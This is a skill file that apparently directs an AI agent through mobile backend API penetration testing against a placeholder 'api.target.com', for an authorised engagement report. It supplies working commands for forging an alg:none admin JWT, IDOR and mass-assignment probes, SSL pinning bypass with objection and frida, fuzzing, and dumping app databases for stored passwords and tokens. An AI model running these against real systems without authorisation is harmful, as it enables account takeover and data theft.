---
name: mobile-dynamic
description: "Mobile dynamic testing skill. API security testing, traffic analysis, session management, authentication bypass, and business logic testing for mobile backend APIs. Triggers: 'mobile api', 'mobile dynamic', 'mobile traffic', 'api testing mobile', 'mobile backend'."
---

# Mobile Dynamic Testing

You are testing the **mobile application's backend API** for security vulnerabilities. This phase focuses on the API endpoints discovered via traffic interception.

## Tool Priority Order

1. **objection** — runtime manipulation, bypass controls
2. **frida** — custom instrumentation hooks
3. **burpsuite / mitmproxy** — API traffic interception
4. **nuclei** — API vulnerability scanning (with mobile-specific templates)
5. **ffuf** — API endpoint fuzzing

## Workflow

### Phase 1: API Discovery

```bash
# From Burp proxy logs, extract all API endpoints
cat burp-proxy.log | grep -oP "https?://[^ ]+/api/[^ ]+" | sort -u > api-endpoints.txt

# Or from jadx/apktool output
grep -rE "(https?://[^\"']+/api/[^\"']+)" ./jadx-output/ --include="*.java" | \
  grep -oP "https?://[^\"']+" | sort -u > hardcoded-endpoints.txt

# Combine
cat api-endpoints.txt hardcoded-endpoints.txt | sort -u > all-endpoints.txt
```

### Phase 2: Authentication Testing

```bash
# Test token expiry — use an old token
curl -H "Authorization: Bearer <old_token>" https://api.target.com/v1/user

# Test JWT weaknesses
# Decode JWT (no verification):
echo "<jwt_token>" | cut -d. -f2 | base64 -d 2>/dev/null | jq '.'

# Check for alg:none bypass
python3 << 'EOF'
import base64, json
header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip("=")
payload_data = {"user_id":1,"role":"admin","exp":9999999999}
payload = base64.b64encode(json.dumps(payload_data).encode()).decode().rstrip("=")
print(f"{header}.{payload}.")
EOF

# Test IDOR (Insecure Direct Object Reference)
# Change user_id in requests
curl -H "Authorization: Bearer <token>" https://api.target.com/v1/user/1/profile
curl -H "Authorization: Bearer <token>" https://api.target.com/v1/user/2/profile  # other user's data?

# Mass assignment test — send extra fields
curl -X PUT https://api.target.com/v1/user/profile \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","role":"admin","balance":999999}'
```

### Phase 3: SSL Pinning Bypass (for traffic interception)

```bash
# Android — via objection
objection -g com.target.app explore --startup-command "android sslpinning disable"

# iOS — via objection
objection -g com.target.app explore --startup-command "ios sslpinning disable"

# Advanced: custom frida script for specific pinning library
# - OkHttp3: use frida-scripts/OkHttp3CertificatePinning.js
# - TrustKit: use frida-scripts/TrustKit.js
# - Custom: hook X509TrustManager.checkServerTrusted() to no-op
```

### Phase 4: API Fuzzing

```bash
# Fuzz parameters on discovered endpoints
ffuf -u "https://api.target.com/v1/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt \
  -H "Authorization: Bearer <token>" \
  -mc 200,201,403 -o api-fuzz.json

# Fuzz with authentication (common API paths)
ffuf -u "https://api.target.com/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/common-api-endpoints.txt \
  -H "Authorization: Bearer <token>" \
  -mc 200,401,403 -o hidden-endpoints.json
```

### Phase 5: Nuclei API Scanning

```bash
# Run mobile/API-focused templates
nuclei -u https://api.target.com \
  -H "Authorization: Bearer <token>" \
  -tags "api,jwt,idor,auth" \
  -severity medium,high,critical \
  -json -o nuclei-api.json

# JWT-specific templates
nuclei -u https://api.target.com \
  -t ~/nuclei-templates/http/exposures/tokens/ \
  -json -o nuclei-tokens.json
```

### Phase 6: Certificate Validation Testing

```bash
# Test with self-signed cert
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 1 -nodes -subj "/CN=api.target.com"
mitmproxy --listen-port 8080 --certs *=cert.pem

# If app accepts self-signed = no cert validation
curl -x http://localhost:8080 -k https://api.target.com/v1/user \
  -H "Authorization: Bearer <token>"
```

### Phase 7: Sensitive Data in Storage

```bash
# Android — check SQLite databases created after login
adb shell "run-as com.target.app ls /data/data/com.target.app/databases/"
adb shell "run-as com.target.app sqlite3 /data/data/com.target.app/databases/app.db .dump" > db-dump.sql
grep -iE "(password|token|credit|card|ssn)" db-dump.sql

# Check SharedPreferences
adb shell "run-as com.target.app cat /data/data/com.target.app/shared_prefs/*.xml"

# iOS — check NSUserDefaults after login (via frida)
frida -U -f com.target.app --no-pause -e \
  "console.log(JSON.stringify(ObjC.classes.NSUserDefaults.standardUserDefaults().dictionaryRepresentation()))"
```

## Output Structure

```
engagement/mobile/dynamic/
├── api-endpoints.txt           # Discovered API endpoints
├── api-fuzz.json               # Fuzzing results
├── nuclei-api.json             # Nuclei scan results
├── db-dump.sql                 # App database contents
├── traffic/                    # Burp exported traffic
│   ├── login-flow.xml
│   └── authenticated-requests.xml
└── findings/                   # Confirmed vulnerabilities
    ├── idor-user-2.txt
    └── jwt-alg-none.txt
```

## Next Phase

Pass all findings to `mobile-report` for final report.
